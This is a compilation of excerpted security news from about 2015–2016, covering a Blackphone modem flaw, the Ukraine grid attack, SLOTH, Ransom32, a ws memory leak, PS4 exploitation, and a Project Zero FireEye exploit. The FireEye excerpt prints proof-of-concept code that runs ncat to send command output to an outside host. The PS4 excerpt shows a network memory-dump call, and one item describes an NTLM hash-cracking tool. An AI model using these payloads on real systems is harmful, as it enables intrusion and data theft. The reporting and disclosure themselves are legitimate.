## Vulnerability in Blackphone Allows Complete Takeover

- Modem Flaw Exposes Encrypted Device to Hacking The Blackphone is generally considered the most secure smartphone available today.

- We recently discovered a vulnerability that could allow an attacker to remotely control the phones modem functions. Developed by SGP Technologies, a wholly owned subsidiary of SilentCircle, the Blackphone provides users control over app permissions, such as the bundled Silent Phone and Silent Text services that anonymise and encrypt communications so no one can eavesdrop on voice, video and text calls. As part of reverse engineering exercise to prepare for a Red Naga training session we discovered this socket was left open and accessible on the Blackphone (BP1) shell@blackphone:/dev/socket $ ls -l at_pal srw-rw-rw- radio system 2015-07-31 17:51 at_pal There is almost no mention of this socket anywhere on the internet  except for file_contexts used by SELinux on Android.

- As we dug deeper we found a few applications which interact with this socket, specifically agps_daemon, which has more elevated privileges than a normal shell/app user since it is a system/radio user. Prior to reversing anything and looking at system logs we can see agps_daemon reveals some interesting details; I/AGPSD ( 219): agps_PortParseArgs: Getting property (agpsd.dev_path=/dev/ttySHM3) from environment  I/AGPSD ( 219): agps_PortParseArgs: Getting property (agpsd.socket_path=/dev/socket/at_pal) from environment  D/AGPSD ( 219): Kernel time: [9.408745]  D/AGPSD ( 219): vendor/nvidia/tegra/prebuilt/ceres/../../icera/ril/agpsd/agps_daemon.c Version : 1.12  D/AGPSD ( 219): vendor/nvidia/tegra/prebuilt/ceres/../../icera/ril/agpsd/agps_daemon.c Built Dec 2 2014 12:00:30  D/AGPSD ( 219): agps_uplinkThread: Entering  I/AGPSD ( 219): open_tty_port: Opening /dev/ttySHM3  I/AGPSD ( 219): agps_downlinkThread: Entering According to the logs, this appears to be an nVidia Icera modem binary, which is listening to a socket_path /dev/socket/at_pal and also opening a tty_port on /dev/ttySHM3.

- The issue was assigned CVE-2015-6841 and has been fixed through the Bugcrowd bug bounty for SilentCircle. This vulnerability illustrates the breadth and depth of the attack surface on this and other devices.

- And finally, virtually all vulnerabilities require some form of malware in order to be remotely exploited.

## Experts Think They've Found The First International Cyberattack To Cause A Blackout

- Now cybersecurity experts are claiming that the power outage was caused by a cyberattack, likely originating in Russia.Its a milestone because weve definitely seen targeted destructive events against energy beforeoil firms, for instancebut never the event which causes the blackout, John Hultquist, head of the cybersecurity firm iSights cyber espionage intelligence practice, told ArsTechnica.

- Its the major scenario weve all been concerned about for so long.Ukraines security service has blamed the incident on Russia for weeks, though definitively establishing the source of cyberattacks is always difficult.iSights researchers attributed the blackouts to a virus that disconnected electrical stations from the power grid.

- They named the group behind the attacks Sandworm. Theyve previously said the same team was behind a Russian cyberespionage campaign iSight observed in 2014 using the same virus to target NATO, energy sector firms, and government organizations in Ukraine, Poland, and western Europe.The team prefers the use of spear-phishing [aka targeting individuals to unwittingly provide them with access] with malicious document attachments to target victims, wrote iSight.

- Many of the lures observed have been specific to the Ukrainian conflict with Russia and to broader geopolitical issues related to Russia.Sandworm, iSight added, was also known for its use of a virus named Black Energy. On Tuesday, the antivirus firm ESET separately reported that multiple electrical stations in Ukraine were infected by a virus they named as BlackEnergy, which first surfaced two years ago but has since been updated.

- In its current form the virus allows an attacker ongoing access to a system, as well as the ability to destroy part of the computer hard drive and sabotage industrial control systems.We have discovered that the reported case was not an isolated incident and that other energy companies in Ukraine were targeted by cybercriminals at the same time, wrote ESET researchers in a blog post.

## CitiBank Trader Created Safe Exchange To Avoid the CIAs Spying In China And USA

- Today our guest is Daniel Dabek, Founder and core developer of Safex. When he first saw the Safe Network in June 2014 upon meeting Paige Peterson, who does work for MaidSafe, he realised that this platform was going to be very important.

- Projects that could use his expertise in the needs of Wall Street traders. CoinTelegraph: Former CitiBank shares trader is solving a problem, how to avoid the CIAs spying in China and USA to keep privacy and secrets in business.

- What is its purpose? DD: Certainly, Safe Exchange is a digital contract marketplace that lets people create a cryptographic version of an underlying thing and be able to transfer it by message or through sale.

- In no way can the service or the network determine any level of information that will be compromising by attacking the software itself. This means that people could offer to sell anything that they choose without having their geographic location disclosed.

- Because all of our life and data is getting sliced through by anyone who can afford to buy it (the information) and anyone who has access like in the case of blockchain ledger systems.  The issue is in the mechanisms that are available.

## Security Losses from Obsolete and Truncated Transcript Hashes

-  SLOTH Security Losses from Obsolete and Truncated Transcript Hashes (CVE-2015-7575)     Technical Paper: Transcript Collision Attacks: Breaking Authentication in TLS, IKE, and SSH, Karthikeyan Bhargavan and Gaetan Leurent, Network and Distributed System Security Symposium (NDSS 2016)  In response to recent high-profile attacks that exploit hash function collisions, software vendors have started to phase out the use of MD5 and SHA1 in third-party digital signature applications such as X.509 certificates. However, weak hash functions continue to be used in various cryptographic constructions within mainstream protocols such as TLS, IKE, and SSH, because practitioners argue that their use in these protocols relies only on second preimage resistance, and hence is unaffected by collisions.

- We systematically investigate and debunk this argument.    We identify a new class of transcript collision attacks on popular cryptographic protocols such as TLS, IKE, and SSH, that significantly reduce their expected security.

- For example, MD5 signatures have been known to be cryptographically broken since at least 2005, but they continue to be used in TLS today, when collision attacks have become significantly more practical, even on standard desktop workstations.

- This list will evolve as we gather more information.  OpenSSL clients and servers up to version 1.0.1e advertise, send, and accept RSA-MD5 signatures.

- Our research is part of a wider effort on investigating the security of TLS and its implementations, called miTLS. You can contact us at our email addresses: [FirstName].

## On the dangers of a blockchain monoculture

- So as far as Im concerned, as soon as we remove the consensus-by-lottery using proof-of-work part of the blockchain, it ceases to lose meaning and lapses into a much more general set of ideas which solve a similar class of problems but have been in use for decades, are distinct from Bitcoin, and are in no way blockchain technology. I would argue the etymology of blockchain can be traced to a sort of mutated, colloquial term for Satoshis original proof-of-work chain concept, and that as soon as you move beyond consensus-by-proof-of-work you are no longer using a blockchain.

- But I dont think the great database in the sky is going to be unlocked by cobbling together disparate parts into a Rube Goldberg apparatus. Believe me that I would like to see the craziest fantasies of what people hope to accomplish with decentralized systems realized.

- Bitcoin is hitting scalability limits under a relatively modest payment volume. The only thing I think blockchain technology has actually delivered on is hype: a press release with blockchain in the title garners media attention (I direct you back to the opening paragraph of this post if you doubt that).

- I wont dispute that blockchain is pretty much guaranteed to engender a lot more excitement in your average engineer than ledger, reconciliation, settlement, or notarization. In the meantime, blockchain technology advocates need a litany of big-name positive endorsements of blockchain to lend credibility to the idea, even if its little more than expressing interest in the concept.

- Thus we wind up with a positive feedback loop of hype without anyone actually delivering on anything valuable. Thats not to say that the idea of decentralized transaction ledgers and timestamping systems lacks merit, but I dont think copying and pasting Satoshi-and-friends codebase all over the place is the best way to go about solving the problem.

## Dell Computers Has Been Hacked

- "There is no other way the person would have my name, cell phone number, and know I had a Dell computer if it didn't come from your company..." posted one unhappy customer in June.

- " In my case the scammers suggested I enter their domain name into my "Run window", which would've taken me to a site where I could download software to allow remote access to my system.

- (This presumably would allow the scammers to make a more compelling case that my computer was infected and in need of their high-priced support services...) In June someone identified as "Social Media Support" on Dell's forums responded to the complaints by saying it was "under investigation," then reassured Dell's customers by pointing to a post where the same thing had happened to somebody else. But in fact, there were seven more identical complaints in two other threads. "How did they gain access to such secure information from Dell?

- " But unfortunately, the FTC's announcement makes it clear that that was a much less sophisticated scam that involved simply placing online ads targeted to people searching for solutions to technical problems.

- ("[I]n some instances, the technicians removed consumers' antivirus and security software already installed on the computers and replaced it with some other programs...") It was disturbing to learn that they'd been in business "since at least 2013" before the FTC finally managed to shut them down.

## Ransom32 is the first Ransomware written in Javascript

- Located on an underground TOR site, the Ransom32 RaaS is a simple, but efficient, service where anyone can download and distribute their very own copy of the ransomware executable as long as they have a bitcoin address.

- Don't be too greedy or people will not pay Fully lock the computer: By default the lockscreen will popup each X seconds after being minimized.

- Once the customized ransomware is downloaded, it is up to the affiliate to determine how it should be distributed. An important feature for any "commerce" campaign is to be able to track its performance.

- This ransomware uses the NW.js platform that allows developers to create native applications for Linux, Mac, and Windows using HTML5, CSS3, Javascript, and WebGL.

- This means that with some minor tweaks, the Ransom32 developers could easily make NW.js packages for Linux and Mac computer.

## Node Security Project - Remote Memory Disclosure (vulnerable  1.0.1)

- Overview UPDATE Jan 6, 2016 Some additional, important details have been made available by Stuart Larsen.

- The client (which could in fact be the server in certain instances) is that one that allocates and sends the memory that is then echo'd by the server. A vulnerability was found in the ping functionality of the ws module which allowed clients to allocate memory by sending a ping frame.

- The ping functionality by default responds with a pong frame and the previously given payload of the ping frame. This is exactly what you expect, but internally ws always transforms all data that we need to send to a Buffer instance and that is where the vulnerability existed.

- ws didn't do any checks for the type of data it was sending.

- So the client would allocate 100 bytes of non-zeroed buffer and send that to the server. Example POC var ws = require('ws')

## HTTPS Bicycle Attack

- It is usually assumed that HTTP traffic encapsulated in TLS doesnt reveal the exact sizes of its parts, such as the length of a Cookie header, or the payload of a HTTP POST request that may contain variable-length credentials such as passwords.

- In this paper I show that the redundancy of the plaintext HTTP headers included in each and every request can be exploited in order to reveal the length of particular components (such as passwords) of particular requests (such as authentication to a web application).

- The redundancy of HTTP in practice allows for an iterative resolution of the length of unknowns in a HTTP message until the lengths of all its components are known except for a coveted secret, such as a password, whose length is then implied.

- The attack furthermore exploits the property of stream-oriented cipher suites such as those based on Galois/Counter Mode that the exact size of the plaintext can be known to a man-in-the-middle. The paper furthermore gives insight in how very small differences in the length of intercepted (encrypted) GPS coordinates can be used to estimate the location on the world map for a particular encrypted coordinate.

- Another example demonstrates that differences in length of intercepted (encrypted) IPv4 addresses are bound to specific IP ranges. The paper concludes with a set of proposed mitigations against this attack. Click here to read the paper.

## Setting Up Country Blocking with pfSense

- pfBlocker is one of pfSense's add-on packages and it provides the ability to block the IP addresses that have been allocated to various countries.

- For the equivalent capabilities with additional features, albeit with increased setup complexity, see the Setting Up Blocking Lists section.  4.

- Configure pfBlocker Top Spammers The pfBlocker "Top Spammers" tab provides a shorthand for selecting the countries with the reputation for having the most prolific and/or dangerous criminals, hackers and/or spammers and to apply some actions to the traffic that originates from IP addresses assigned to the selected countries.   select the applicable Action you want to have applied:   Disabled will turn off this capability   any of the Deny ... or Permit ... options will disallow or allow, respectively, all traffic that originates from IP addresses assigned to the selected countries   this is sufficient if you have a simple network/firewall setup but will be too simplistic for more involved setups, in which case you can use the "Alias only" selection   use "Deny Inbound" to prevent incoming connections to your network from the selected countries, but still allow systems on your network to connect to systems with IPs that were assigned to those countries   use "Deny Both" to prevent both incoming connections to your network from the selected countries and outgoing connections from your network to systems with IPs that were assigned to those countries   this offers some additional security in that, if a system on your network was compromised (e.g., via a "trojan"), it would not be able to communicate back to a system which had an IP address assigned to one the selected countries   this is likely more useful when the blocking list is a known list of criminal-controlled systems, for example, than for an entire country's IPs       Alias only will create an entry in Firewall  Aliases  URLs and a table entry (view via the Diagnostics  Tables  Table pop-up menu)   that alias can be used in defining firewall rules so provides more flexibility but requires additional configuration (see Setting Up Blocking Firewall Rules section)       you should now have something like:   and, if you selected "Alias only" as the "Action" and visit the Firewall  Aliases  URLs tab, you now have the following entry: I have not used the pfBlocker "Top Spammers" capability because I've selected a broader range of countries based upon the collection of countries in each of the 6 "world area" tabs.  5.

- For each "world area":   in pfSense, visit the applicable "world area" tab  e.g., Firewall  pfBlocker  South America tab   select the applicable Action you want to have applied:   Disabled will turn off this capability   any of the Deny ... or Permit ... options will disallow or allow, respectively, all traffic that originates from IP addresses assigned to the selected countries   this is sufficient if you have a simple network/firewall setup but will be too simplistic for more involved setups, in which case you can use the "Alias only" selection   use "Deny Inbound" to prevent incoming connections to your network from the selected countries, but still allow systems on your network to connect to systems with IPs that were assigned to those countries   use "Deny Both" to prevent both incoming connections to your network from the selected countries and outgoing connections from your network to systems with IPs that were assigned to those countries   this offers some additional security in that, if a system on your network was compromised (e.g., via a "trojan"), it would not be able to communicate back to a system which had an IP address assigned to one the selected countries   this is likely more useful when the blocking list is a known list of criminal-controlled systems, for example, than for an entire country's IPs       Alias only will create an entry in Firewall  Aliases  URLs and a table entry (view via the Diagnostics  Tables  Table pop-up menu)   that alias can be used in defining firewall rules so provides more flexibility but requires additional configuration (see Setting Up Blocking Firewall Rules section)       you should now have something like:     and, if you selected "Alias only" as the "Action" and visit the Firewall  Aliases  URLs tab, you now have the following entry:    6.

- Create pfBlocker firewall rules If the Alias only option was selected for the Action in the "Top Spamers" tab or any of the "world area" tabs, you'll need to create firewall rules which define how traffic that originates from IP addresses assigned to the selected countries will be treated.

## PS4 security article follow up

- m = info.end; } Within this dump, you won't be able to find strings used by the other process, such as "Options", "Close Window", "Refresh", or "There is not enough free system memory". Graphics One of the main implications of this is clear: if the other process handles displaying graphics, we can't easily hijack the active libSceVideoOut handle. I've been working with xerpi to try to reinitialise libSceVideoOut, but even though all functions are returning good values, we can't get the screen to change from the browser view. Just to be certain that our process can't access any existing video handles created by the other process, we tried brute forcing all positive integers to see if any were valid. Brute forcing with code execution Brute forcing things with the ROP framework was very impractical.

- From this, we can tell that separate processes' modules each have their own internal state, and that our process wasn't using libScePad (since it wasn't already initialised). So, like with graphics, we won't be able to hijack any handles already open, and trying to create new handles won't work either. Maybe we can't read from the controller because it is already in use, and we would be able to read from a second controller, but unfortunately I can't test this since I only have 1 controller. There are two workarounds for this: use the USB library to receive input from a third party controller, or just use any WiFi compatible device with buttons to send input over a UDP socket.

- I created a simple C server called TCP-Dump which you can use if you wish. Refresh the page, and use this chain to send the buffer; replace the IP, port, address, and file size with the appropriate values: sendBuffer("192.168.0.4", 9023, 0x200744000, 8312744); chain.execute(function() { logAdd("Dumped"); });  Using cookies, you can pass information to subsequent stages automatically, but I won't go into it now. You should also note that the filesystem is read only; for example, attempting to overwrite a font will crash your PS4 (but it'll be fine afterwards). We can also dump the modules located at /sandboxDir/common/lib/, but they are encrypted. Encryption The most common questions I am asked pertain to encryption.

- It is a huge part of the PS4's security which prevents us from analysing firmware updates, games, saves and more. The reason I didn't mention encryption in my last article is because trying to defeat it would be a complete waste of time.

- The PS4 probably uses AES (like the PS3 and PS Vita), which is the same type of encryption used by the U.S. government. People also don't seem to realise that there are multiple encryption keys used within the PS4; even if we found a way to decrypt save data, we still wouldn't be able to decrypt PUP updates for example. With the current level of access we have to the PS4 there is no way to get any keys: brute forcing them would take longer than the lifetime of the universe even under ideal conditions, and I doubt any of the few engineers at Sony trusted with them would want to lose their job by leaking them. The only exception to this is would be for implementation mistakes such as the PS3's infamous use of the constant 4 instead of what should have been a random number. Whilst it is unlikely that Sony has made another mistake like this in the core of the PS4's encryption, it is not uncommon for other companies to accidentally give us access to unencrypted content.

## Cybersecurity Researchers Are Hunted From All Sides

- While he was analyzing Stuxnet, a worm written by the US and Israel and considered to be the first cyber weapon, someone broke into his house. The intruder left behind a decision cubea rubber die inscribed with conclusions like yes, no, maybeon his living room table with the message take a break facing up. These stories of being threatened are common throughout the tight-knit community of high-profile cybersecurity researchers, but few are willing to share them openly. If you are engaged in tracking cybercriminals, in research, you have to be really careful about your surroundings, your family, the people around you, said Righard Zwienenberg, ESET security expert.

- Web, whose products are used by banking, telecom and oil companies, was bombed with Molotov cocktails after its researchers revealed that a gang created and sold a Trojan able to steal money from ATMs. Dr.

- The end of Doctor Web will be tragic. CEO Boris Sharov decided not to satisfy the demand. In March 2014, a company in St. Petersburg that distributed Dr. Webs ATM Shield software was attacked three times with Molotov cocktails, with limited damage.

- There have also been two physical intrusions into Dr. Webs office in Moscow. The security company believes that the Molotov cocktail attacks were executed by strangers paid over the internet by a group of developers who sold software to several gangs specialized in cashing out hacked ATM cards.

- Officers came to Krebss house, pointed shotguns and assault rifles at him, and handcuffed him, before letting him go and apologizing. The swatting incident happened together with a DDoS attack on his blog. Then in the summer of 2013, Krebs received a heroin package from the administrator of an exclusive cybercrime forum who wanted to frame him.

## BIND Critical Remote Vuln CVE-2015-8000 Responses with a malformed class attribute can trigger an assertion failure in db.c

- Description: An error in the parsing of incoming responses allows some records with an incorrect class to be accepted by BIND instead of being rejected as malformed.

- Intentional exploitation of this condition is possible and could be used as a denial-of-service vector against servers performing recursive queries. Impact: An attacker who can cause a server to request a record with a malformed class attribute can use this bug to trigger a REQUIRE assertion in db.c, causing named to exit and denying service to clients.

## ProtonMail Blog Guide to DDoS protection

- We knew this was a risk of disclosure, but we stand by our decision. One month ago, we had to fight off one of the largest and most sophisticated DDoS attacks to hit Europe this year.

- In reality, it is very difficult to also ensure that your datacenter and upstream providers are able to resist a large scale attack, so the only real solution is to build your infrastructure in a way that makes you as independent as possible.

- Unfortunately, due to the remote location of our datacenter, this required running a direct connection 114 kilometers from the main Swiss point of presence in Zurich to our underground facility.

- Fortunately, we had the foresight to join RIPE in 2014 and were already a LIR so this requirement was met. The dirty traffic is sent to the DDoS mitigator which typically has massive network capacity.

- Thus, there is no compromise in the privacy of our secure email service. Conclusion The attack faced by ProtonMail was highly sophisticated and unfortunately required extraordinary effort to defeat.

## Breaking and evading Linux with a new technique

-  The focus of any malware research is on anticipating where an attack may go, or where its already been in order to develop and implement new prevention techniques.

- While reverse engineering some recent Linux malware samples, I found an interesting and novel technique being used thats important to share with the broader community.

- However, after continuing through this message I was prompted by a new warning Id not seen before;  This caused the ELF loader to fail in IDA Pro  preventing me from loading the binary for analysis.

- This is a good start at looking to see how ELF files might be abused to hide from analysis, and hopefully with the release of these scripts, people will be able to monitor for this technique being used and other similar ones in the future. Prior to publishing this article, Ive notified Hex-Rays and the 10 engines which failed to detect the slightly modified malware.

- The script for producing and fixing these modified binaries can be found on github here. Yara Rule:

## The Big List of What's Wrong with the TPP

-   The EFF has analyzed the TPPs impact on digital rights, closely reading the documents many chapters, and has broken down the problems with TPP based on 13 categories:  General Audience; Innovators and Business Owners; Libraries, Archives, and Museums; Students; Online Privacy and Digital Security; Website Owners; Gamers; Artists; Journalists and Whistleblowers; People with Sensory Disabilites; Tinkerers and Repairers; Free Software; and Cosplayers and Fans of Anime, Cartoons, or Movies.

- Which one are you and how will TPP screw you over?       Cosplayers and Fans of Anime, Cartoons, or Movies * Excessive copyright terms of life of the creator plus 70 years keep digital creative works, including anime, comic books, and movies, locked behind onerous restrictions for longer.* Fans putting on a themed party or cosplay based on a character from a favorite show or movie could be forced to pay a penalty or have images from it removed from the Internet.

- That means law enforcement can go after fans for derivative works on a commercial scale without the author of the original work filing charges.     How the TPP Will Affect You and Your Digital Rights  [Maira Sutton/EFF]  (Image: Roadside: TPP Leesburg, GlobalTradeWatch, CC-BY-SA) 

- Instead of wading through emails and logging onto your favorite e-comm site to get your tracking info, EasilyDo presents it for you.

- Earhoox offer an easy solution in the form of silicone molds that wrap around your EarPods, helping them apply traction and pressure to key points on your ear.

## Project Zero FireEye Exploitation Project Zeros Vulnerability of the Beast

- Posted by Tavis Ormandy, Chief Silver Bullet Skeptic.  FireEye sell security appliances to enterprise and government customers.

- This requires adjusting the local routing table and creating device specific rules accordingly. # First, make sure Linux will accept local-hub-local traffic echo 1  /proc/sys/net/ipv4/conf/all/accept_local # Give the two interfaces connected to the hub static addresses. ip addr add 192.168.2.2 dev eth2 ip addr add 192.168.2.1 dev eth3 # Route traffic destined for each address to the *opposite* device ip route add 192.168.2.1 dev eth2 ip route add 192.168.2.2 dev eth3 # Force Linux to forget that these are local interfaces so the traffic actually reaches the hub. ip route del 192.168.2.2 table local ip route del 192.168.2.1 table local # Now add corresponding rules for each interface ip rule add iif eth2 lookup 100 ip route add local 192.168.2.2 dev eth2 table 100 ip rule add iif eth3 lookup 101 ip route add local 192.168.2.1 dev eth3 table 101 To make the management interface accessible, configure the ether1 interface on the FireEye via ttyS0 with a static address on the correct subnet. # Enable the management interface on my workstation ifconfig eth1 up 192.168.1.1 netmask 255.255.255.0 # Now configure the management interface on the FireEye fireeye no interface ether1 dhcp fireeye interface ether1 ip address 192.168.1.2 255.255.255.0 This allows access to the FireEye device via the management interface, and to generate simulated traffic across the network tap from the same machine. Once this is configured, to simulate a user downloading a file from the internet, you simply download across 192.168.2.2/24: # Start a python web server to simulate a website $ sudo python -m SimpleHTTPServer 80  # Create a file to download $ echo hello  test.txt # Download the file across the hub, so that the FireEye can see it Logging in to the FireEye management interface and using tcpdump to verify the passive interface can see the simulated network traffic: fireeye tcpdump -i pether3 tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on pether3, link-type EN10MB (Ethernet), capture size 262144 bytes13:38:30.980073 IP 192.168.2.1.58276  192.168.2.2.http: Flags [S], seq 2112408534, win 29200, options [mss 1460,sackOK,TS val 1133741089 ecr 0,nop,wscale 7], length 013:38:30.981065 IP 192.168.2.2.http  192.168.2.1.58276: Flags [R.], seq 0, ack 2112408535, win 0, length 0 This confirms that the FireEye is successfully monitoring the simulated network. FireEye Architecture The main analyses performed by the FireEye appliance are monitoring for known malicious traffic (blacklisted netblocks, malware domains, snort rules, etc), static analysis of transferred files (antivirus, yara rules, and analysis scripts), and finally tracing the execution of transferred files in instrumented virtual machines.

- This code in particular attempts to handle method invocation in static constructors.  This looked scary enough for further investigation, so I extracted the JODE package from the FireEye device to examine it more closely.

- Here is the sample jasmin code we used, simply using ncat to execute /usr/bin/id and send the result over the network: .method public static obf(Ljava/lang/String;)Ljava/lang/String; .limit locals 1 .limit stack 8 invokestatic java/lang/Runtime/getRuntime()Ljava/lang/Runtime; ldc "ncat example.com 9090 -e /usr/bin/id" invokevirtual java/lang/Runtime/exec(Ljava/lang/String;)Ljava/lang/Process; ldc "test" areturn.end method The full jasmin assembly file is available on the Project Zero issue tracker.

- We can load a rootkit, persist across reboots or factory resets, inspect or modify traffic, or perform any other action. Putting these steps together, an attacker can send an email to a user or get them to click a link, and completely compromise one of the most privileged machines on the network. This allows exfiltration of confidential data, tampering with traffic, lateral movement around networks and even self-propagating internet worms. If you would like to read more from our series on attacks against security products, we have also published research into ESET, Kaspersky, Sophos, Avast and more, with further research scheduled for release soon. Acknowledgements This vulnerability was discovered by Tavis Ormandy and Natalie Silvanovich of Google Project Zero. Many thanks to FireEye for supporting our research and working with us to improve security.

## Positive Hack Days VI Conference Call For Papers is Now Open

- Positive Hack Days VI, the international forum on practical information security, opens Call for Papers on December 3, 2015.

- A new concept of PHDays VI is designed to show what the current vibe is in information security. We want researchers to speak about the real dangerous threats and possible consequences.

- Come and share your experience at PHDays VI in Moscow, May 17 and 18, 2016. Your topic can revolve around any modern infosec field: new targeted attacks against SCADA, new threats to medical equipment, vulnerabilities of online government services, unusual techniques to protect mobile apps, antisocial engineering in social networks, or what psychological constitution SOC experts have.

- In addition, this year, we are planning to discuss IS software design, development tools, and SSDL principles. Our key criteria is that your research should be unique and offer a fresh perspective on hacking, modern information technologies, and the role they play in our lives. If you have something interesting or surprising to share, but none of the formats are suitable for your participation, please apply anyway and be sure we will consider your work. The first stage of CFP ends on January 31, 2016.

- In 2016, it is expected to see 4,000 attendees: information security leaders, CIO and CISO of the world's largest companies, top managers of giant banks, industrial and oil and gas producing enterprises, telecoms, and IT vendors, representatives from different government departments.

## Autoresponder - Automatically load NTLM hashes from Responder logs and fires up Hashcat to crack them

- This project is highly inspired from Autoresp from Dan McInerney.

- The aim of this python script is to run in addition with Responder while doing internal assessments.

- This script will monitor the logs from Responder, loads NTLMv1 and NTLMv2 on the fly and crack them with your instance of Hashcat.

- optional arguments: -h, --help       show this help message and exit -w WORDLIST      Path to the worlists.

- As soon as you launch the script, it will retrieve all the hashes stored in the logs folder and start bruteforcing them.
